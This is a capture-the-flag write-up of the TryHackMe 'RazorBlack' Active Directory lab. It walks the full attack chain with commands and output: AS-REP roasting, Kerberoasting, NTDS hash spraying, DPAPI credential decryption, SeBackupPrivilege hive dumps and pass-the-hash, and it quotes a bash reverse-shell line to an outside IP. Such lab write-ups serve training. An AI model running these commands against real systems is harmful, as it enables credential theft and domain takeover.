# RazorBlack — TryHackMe Writeup

> **Difficulty:** Hard  
> **OS:** Windows Server 2019  
> **Tags:** Active Directory, Kerberos, NFS, Backup Operators, DPAPI, Pass-the-Hash  
> **Author:** Xyan1d3  

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [NFS Enumeration — Unauthenticated File Disclosure](#nfs-enumeration)
3. [AS-REP Roasting — twilliams](#as-rep-roasting)
4. [Domain Enumeration with Valid Credentials](#domain-enumeration)
5. [Kerberoasting — xyan1d3](#kerberoasting)
6. [WinRM Shell — xyan1d3 (PSCredential DPAPI)](#winrm-shell-xyan1d3)
7. [Password Change — sbradley](#password-change-sbradley)
8. [SMB Trash Share — ZeroLogon NTDS Dump](#smb-trash-share)
9. [NTDS Hash Spray — lvetrova](#ntds-hash-spray)
10. [WinRM Shell — lvetrova (PSCredential DPAPI)](#winrm-shell-lvetrova)
11. [Privilege Escalation — SeBackupPrivilege → Administrator](#privesc)
12. [Root Flag & Remaining Objectives](#root-flag)
13. [Full Kill Chain Summary](#kill-chain)
14. [Tools Used](#tools-used)
15. [Lessons Learned](#lessons-learned)

---

## Reconnaissance <a name="reconnaissance"></a>

### Full Port Scan

```bash
nmap -p- 10.x.x.x
```

28 open ports identified. Key services:

| Port | Service | Significance |
|------|---------|-------------|
| 53 | DNS | Domain Controller indicator |
| 88 | Kerberos | AD authentication |
| 111, 2049 | **NFS** | **Unusual on Windows DC — misconfiguration** |
| 135, 139, 445 | SMB/RPC | File shares, enumeration |
| 389, 636 | LDAP/LDAPS | Directory queries |
| 3268, 3269 | Global Catalog | Forest-wide LDAP |
| 464 | kpasswd | Kerberos password changes |
| 5985 | WinRM | Remote PowerShell |
| 3389 | RDP | Remote Desktop |
| 9389 | ADWS | AD Web Services |

### SMB Banner Grab

```bash
netexec smb 10.x.x.x
```

```
(name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
```

**Key findings:**
- **Domain:** `raz0rblack.thm`
- **Hostname:** HAVEN-DC (Domain Controller)
- **OS:** Windows Server 2019 Build 17763
- **SMB Signing:** Enabled (NTLM relay attacks not possible)
- **Null Authentication:** Allowed (anonymous enumeration possible)

### LDAP RootDSE Confirmation

```bash
nmap -p 389 --script ldap-rootdse 10.x.x.x
```

Confirmed `defaultNamingContext: DC=raz0rblack,DC=thm`, Kerberos realm `RAZ0RBLACK.THM`, and domain functional level 7 (Windows Server 2016).

> **Answer — Domain name:** `raz0rblack.thm`

---

## NFS Enumeration — Unauthenticated File Disclosure <a name="nfs-enumeration"></a>

NFS on a Windows DC is atypical and often misconfigured (CWE-732: Incorrect Permission Assignment).

```bash
showmount -e 10.x.x.x
# Export list: /users (everyone)

mkdir /tmp/nfs
mount -t nfs 10.x.x.x:/users /tmp/nfs -o nolock
ls -la /tmp/nfs/
```

Two files recovered:

| File | Content |
|------|---------|
| `sbradley.txt` | Steven's flag: `THM{ab53e05c...REDACTED}` |
| `employee_status.xlsx` | 12-member employee roster with roles |

### Employee List (HAVEN SECRET HACKER's CLUB)

| Name | Role |
|------|------|
| daven port | CTF Player |
| imogen royce | CTF Player |
| tamara vidal | CTF Player |
| arthur edwards | CTF Player |
| carl ingram | CTF Player (Inactive) |
| nolan cassidy | CTF Player |
| reza zaydan | CTF Player |
| **ljudmila vetrova** | **CTF Player, Developer, AD Admin** |
| rico delgado | Web Specialist |
| tyson williams | Reverse Engineering |
| steven bradley | Stego Specialist |
| chamber lin | CTF Player (Inactive) |

From the known `sbradley` format, usernames follow `first_initial + lastname`:

```
dport, iroyce, tvidal, aedwards, cingram, ncassidy,
rzaydan, lvetrova, rdelgado, twilliams, sbradley, clin
```

> **Answer — Steven's flag:** `THM{ab53e0...REDACTED}`

---

## AS-REP Roasting — twilliams <a name="as-rep-roasting"></a>

### Theory

When a domain account has the `UF_DONT_REQUIRE_PREAUTH` flag set, any user can request a TGT from the KDC without proving they know the password. The returned TGT is encrypted with the account's NTLM hash, enabling offline brute-force (Hashcat mode 18200).

**MITRE ATT&CK:** T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting

### Execution

```bash
GetNPUsers.py raz0rblack.thm/ -usersfile /tmp/users.txt -dc-ip 10.x.x.x -no-pass -format hashcat
```

**Results:**

| Status | Users | Meaning |
|--------|-------|---------|
| **AS-REP Roastable** | `twilliams` | Pre-auth disabled, hash obtained |
| Protected | `lvetrova`, `sbradley` | Pre-auth enabled |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Remaining 9 | Wrong username format |

### Hash Cracking

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

> **Cracked:** `twilliams` : `roastpot****` (redacted)

---

## Domain Enumeration with Valid Credentials <a name="domain-enumeration"></a>

### SMB Shares

```bash
netexec smb 10.x.x.x -u twilliams -p '<password>' --shares
```

| Share | Permissions | Notes |
|-------|------------|-------|
| IPC$ | READ | RPC enumeration |
| NETLOGON | READ | Empty — no logon scripts |
| SYSVOL | READ | Standard GPOs, no GPP cpassword leak |
| **trash** | — | "Files Pending for deletion" — no access for twilliams |
| ADMIN$, C$ | — | Admin only |

### Domain Users

```bash
netexec smb 10.x.x.x -u twilliams -p '<password>' --users
```

Only 7 accounts exist in the domain (vs. 12 in the xlsx):
`Administrator`, `Guest`, `krbtgt`, **`xyan1d3`** (not in xlsx), `lvetrova`, `sbradley`, `twilliams`

### LDAP Deep Enumeration

```bash
ldapsearch -x -H ldap://10.x.x.x -D 'twilliams@raz0rblack.thm' -w '<password>' \
  -b 'DC=raz0rblack,DC=thm' '(objectClass=user)' sAMAccountName description memberOf
```

**Critical group memberships:**

| User | Groups | Significance |
|------|--------|-------------|
| **xyan1d3** | Remote Management Users + **Backup Operators** | WinRM shell + can read any file |
| **lvetrova** | Remote Management Users | WinRM shell |
| sbradley | — | Normal user, `pwdLastSet=0` (password must change) |

Notable: xyan1d3's CN is literally `bash -i >&. /dev/tcp/10.8.156.189/8888 0>&1` — a reverse shell embedded in the AD object name (author humor).

---

## Kerberoasting — xyan1d3 <a name="kerberoasting"></a>

### Theory

Any authenticated domain user can request a TGS ticket for any account with a Service Principal Name (SPN). The ticket is encrypted with the service account's NTLM hash, enabling offline cracking (Hashcat mode 13100).

**MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

### Execution

```bash
GetUserSPNs.py raz0rblack.thm/twilliams:'<password>' -dc-ip 10.x.x.x -request
```

```
SPN: HAVEN-DC/xyan1d3.raz0rblack.thm:60111
Account: xyan1d3
MemberOf: CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm
```

### Hash Cracking

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash
```

> **Cracked:** `xyan1d3` : `cyanide9a****` (redacted)

---

## WinRM Shell — xyan1d3 (PSCredential DPAPI) <a name="winrm-shell-xyan1d3"></a>

```bash
netexec winrm 10.x.x.x -u xyan1d3 -p '<password>'
# [+] raz0rblack.thm\xyan1d3:<password> (Pwn3d!)

evil-winrm -i 10.x.x.x -u xyan1d3 -p '<password>'
```

### PSCredential XML — DPAPI Decryption

Found `C:\Users\xyan1d3\xyan1d3.xml` — a PSCredential object exported with `Export-Clixml`. The password is encrypted with DPAPI, bound to the user's master key.

Since we're authenticated as xyan1d3, DPAPI decrypts automatically:

```powershell
$cred = Import-Clixml C:\Users\xyan1d3\xyan1d3.xml
$cred.GetNetworkCredential().Password
```

> **Answer — Xyan1d3's flag:** `THM{...REDACTED}`

**Mechanism:** DPAPI (Data Protection API) ties encryption to a user's SID + master key. Only the same user on the same machine (or SYSTEM) can decrypt. `Import-Clixml` + `GetNetworkCredential()` converts the `SecureString` back to plaintext when run in the correct user context.

---

## Password Change — sbradley <a name="password-change-sbradley"></a>

### Theory

LDAP showed sbradley has `pwdLastSet=0` and `acb_info: 0x00020010` (`ACB_NORMAL` + `ACB_PW_EXPIRED`), meaning the account was created with "User must change password at next logon." The original password is valid but must be changed before any service grants access.

**Key distinction:**
- **Reset** — admin changes another user's password (requires delegation rights)
- **Change** — user changes their own password knowing the current one (SAMR ChangePasswordUser)

### Execution

Testing the initial password (same as twilliams — common practice for bulk account creation):

```bash
netexec smb 10.x.x.x -u sbradley -p 'roastpot****'
# [-] STATUS_PASSWORD_MUST_CHANGE — password is correct but must be changed
```

Changing via Impacket's `changepasswd.py`:

```bash
python3 /usr/local/bin/changepasswd.py raz0rblack.thm/sbradley:'<old_password>'@10.x.x.x -newpass '<new_password>'
# [*] Password was changed successfully.
```

### Verification

```bash
netexec smb 10.x.x.x -u sbradley -p '<new_password>' --shares
# trash   READ   Files Pending for deletion
```

**sbradley now has READ access to the `trash` share.**

---

## SMB Trash Share — ZeroLogon NTDS Dump <a name="smb-trash-share"></a>

```bash
smbclient //10.x.x.x/trash -U 'sbradley%<password>' -c 'ls'
```

| File | Size | Content |
|------|------|---------|
| `chat_log_20210222143423.txt` | 1,340 B | Conversation between sbradley and Administrator |
| `experiment_gone_wrong.zip` | 18.9 MB | **Encrypted ZIP containing ntds.dit + system.hive** |
| `sbradley.txt` | 37 B | Steven's flag (duplicate) |

### Chat Log — Plot Reveal

The chat reveals that sbradley exploited **CVE-2020-1472 (ZeroLogon)** to reset the Administrator's password to an empty hash, then extracted `ntds.dit` and `SYSTEM.hive` using `secretsdump.py`, encrypted them in a ZIP, and uploaded it to the trash share. The Administrator "died of a heart attack" after this incident.

### ZIP Cracking

```bash
zip2john experiment_gone_wrong.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

> **ZIP password:** `electromag****` (redacted)

### Extracting NTDS Hashes

```bash
unzip -P '<zip_password>' experiment_gone_wrong.zip
secretsdump.py -ntds ntds.dit -system system.hive LOCAL > ntds_dump.txt
```

This produced hundreds of domain hashes. However, our target users (lvetrova, xyan1d3, etc.) were **created after this dump** and are not present. The old Administrator hash (`1afedc47...`) was also stale (password changed after ZeroLogon recovery).

---

## NTDS Hash Spray — lvetrova <a name="ntds-hash-spray"></a>

### Strategy

With hundreds of NTLM hashes from the old dump and knowledge that password reuse is common, we spray all hashes against lvetrova's account:

```bash
# Extract clean 32-char hex hashes
grep -E '^[a-f0-9]{32}$' ntds_dump_hashes.txt | sort -u > clean_hashes.txt

# Verify no lockout policy
netexec smb 10.x.x.x -u twilliams -p '<password>' --pass-pol

# Spray
netexec smb 10.x.x.x -u lvetrova -H clean_hashes.txt --continue-on-success
```

> **Hit:** `lvetrova` : `f220d398...REDACTED` (NT hash)

---

## WinRM Shell — lvetrova (PSCredential DPAPI) <a name="winrm-shell-lvetrova"></a>

```bash
evil-winrm -i 10.x.x.x -u lvetrova -H '<hash>'
```

Same PSCredential pattern as xyan1d3:

```powershell
$cred = Import-Clixml C:\Users\lvetrova\lvetrova.xml
$cred.GetNetworkCredential().Password
```

> **Answer — Ljudmila's flag:** `THM{694362...REDACTED}`

---

## Privilege Escalation — SeBackupPrivilege → Administrator <a name="privesc"></a>

### Theory

`SeBackupPrivilege` allows a process to read **any file on the system**, bypassing DACL checks. This is by design — backup software needs to read everything. Combined with `SeRestorePrivilege` (write any file), a Backup Operator can extract registry hives containing local password hashes.

### Dumping SAM/SYSTEM

From evil-winrm as xyan1d3:

```powershell
whoami /priv
# SeBackupPrivilege   Enabled
# SeRestorePrivilege  Enabled

mkdir C:\temp
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
```

**Important:** evil-winrm's `download` command truncates files at ~2MB. The SYSTEM hive is ~17MB. Use SMB instead:

```bash
smbclient //10.x.x.x/C$ -U 'xyan1d3%<password>' -c 'cd temp; get sam; get system'
```

### Extracting Local Hashes

```bash
secretsdump.py -sam sam -system system LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931b...REDACTED:::
```

### Pass-the-Hash → Administrator Shell

```bash
evil-winrm -i 10.x.x.x -u Administrator -H '<hash>'
```

---

## Root Flag & Remaining Objectives <a name="root-flag"></a>

### Root Flag

`C:\Users\Administrator\root.xml` — looks like a PSCredential but fails DPAPI decryption. The "password" field is actually **hex-encoded plaintext** (author trolling):

```powershell
type C:\Users\Administrator\root.xml
# Password field: 44616d6e20796f7520...
```

```bash
echo '44616d6e20796f752061726520...' | xxd -r -p
```

Decoded message reveals the root flag.

> **Answer — Root flag:** `THM{1b4f46...REDACTED}`

### Tyson's Flag

```powershell
type "C:\Users\twilliams\definitely_definitely_definitely_..._not_a_flag.exe"
```

The 80-byte "executable" is a text file containing the flag.

> **Answer — Tyson's flag:** `THM{5144f2...REDACTED}`

### Top Secret

```powershell
Get-ChildItem C:\ -Recurse -Filter "*secret*" -ErrorAction SilentlyContinue
# C:\Program Files\Top Secret\top_secret.png
download "C:\Program Files\Top Secret\top_secret.png"
```

The image is a meme: a chocolate gorilla melting in milk saying _"Listen kid I don't have much time... the way to exit Vim is... :w"_

> **Answer — Top Secret:** `:wq`

### Cookie

`C:\Users\Administrator\cookie.json` contains base64 text decoding to a humorous message about self-flavoring cookies and SQL injection.

> **Answer:** `Yes`

---

## Full Kill Chain Summary <a name="kill-chain"></a>

```
NFS /users (everyone) ─────────────────────────────── sbradley.txt (flag)
                                                       employee_status.xlsx (12 names)
    │
    ▼
username list ──► AS-REP Roasting ──────────────────── twilliams:roastpot****
    │
    ▼
twilliams creds ──► LDAP enum (groups) ─────────────── xyan1d3 = Backup Operators + RMU
                 ──► Kerberoasting ─────────────────── xyan1d3:cyanide9a****
    │
    ▼
xyan1d3 WinRM ──► PSCredential XML (DPAPI) ────────── xyan1d3 flag
    │
    ▼
sbradley STATUS_PASSWORD_MUST_CHANGE ──► changepasswd.py ──► trash share READ
    │
    ▼
trash share ──► experiment_gone_wrong.zip ──► zip2john ──► electromag****
            ──► ntds.dit + system.hive (old ZeroLogon dump)
    │
    ▼
old NTDS hashes ──► hash spray vs lvetrova ─────────── lvetrova NT hash
    │
    ▼
lvetrova WinRM (PTH) ──► PSCredential XML (DPAPI) ─── lvetrova flag
    │
    ▼
xyan1d3 SeBackupPrivilege ──► reg save SAM/SYSTEM ──── live Administrator hash
    │
    ▼
Administrator PTH ──► root.xml (hex decode) ────────── root flag
                   ──► twilliams profile ───────────── tyson flag
                   ──► C:\Program Files\Top Secret ─── top_secret.png (:wq)
```

---

## Tools Used <a name="tools-used"></a>

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning, service enumeration, LDAP RootDSE scripts |
| `netexec` (nxc) | SMB banner grab, share enum, user enum, password policy, hash spray, WinRM check |
| `showmount` / `mount` | NFS export discovery and mounting |
| `GetNPUsers.py` | AS-REP Roasting (Impacket) |
| `GetUserSPNs.py` | Kerberoasting (Impacket) |
| `hashcat` / `john` | Offline hash cracking (modes 18200, 13100, PKZIP) |
| `evil-winrm` | WinRM shell with password and Pass-the-Hash |
| `ldapsearch` | LDAP enumeration of users, groups, attributes |
| `rpcclient` | RPC user queries |
| `smbclient` | SMB file access and reliable large-file downloads |
| `changepasswd.py` | SAMR password change for expired accounts (Impacket) |
| `secretsdump.py` | NTDS.dit / SAM offline hash extraction (Impacket) |
| `zip2john` | ZIP password hash extraction for cracking |
| `openpyxl` | Python XLSX parsing |
| `xxd` | Hex decoding |

---

## Lessons Learned <a name="lessons-learned"></a>

### 1. NFS on Windows DC = Free Loot
NFS exports bypass AD authentication entirely (uid/gid mapping instead of Kerberos). The same pattern appeared in VulnNet: Internal — always check for NFS on Windows hosts.

### 2. STATUS_PASSWORD_MUST_CHANGE ≠ Wrong Password
When `netexec` returns `STATUS_PASSWORD_MUST_CHANGE`, the password is **correct** — the account just needs a password change. Use `changepasswd.py` (SAMR ChangePasswordUser) which operates as the user themselves, not an admin reset.

### 3. evil-winrm Download Truncates Large Files
evil-winrm's `download` command silently truncates files at ~2MB. For large files (SYSTEM hive = ~17MB), use SMB (`smbclient get`) or `impacket-smbclient` instead.

### 4. Old NTDS Dumps + Hash Spray = Lateral Movement
Even stale NTDS dumps are valuable. Password reuse across accounts means spraying old hashes against current users can yield hits — in this case, lvetrova's hash from the old dump still worked.

### 5. PSCredential XML + DPAPI = User-Context-Dependent
`Export-Clixml` encrypts passwords with DPAPI master keys tied to the specific user. Decryption requires running in that user's session context (evil-winrm with their creds/hash counts). Always check for `.xml` files in user profiles.

### 6. SeBackupPrivilege → Full Compromise
Backup Operators can read SAM/SYSTEM hives via `reg save`, extracting the local Administrator hash. Combined with the DC being the only server, this is a direct path to domain admin.

### 7. Not Everything Is What It Seems
The author embedded trolling throughout: hex-encoded "DPAPI" passwords, reverse shells in AD object names, meme images as "top secrets," and 80-byte "executables" that are text files. Always check file sizes and content before assuming format.
